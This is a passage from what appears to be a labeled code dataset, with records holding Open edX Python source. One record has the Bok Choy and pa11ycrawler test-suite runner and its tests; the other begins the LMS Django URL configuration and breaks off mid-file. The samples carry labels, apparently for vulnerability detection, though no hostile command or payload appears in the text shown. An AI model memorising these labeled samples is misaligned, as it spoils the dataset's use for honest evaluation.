\"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n/n/n/n/pavelib/utils/test/suites/bokchoy_suite.py/n/n\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n/n/n/n", "label": 1}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', 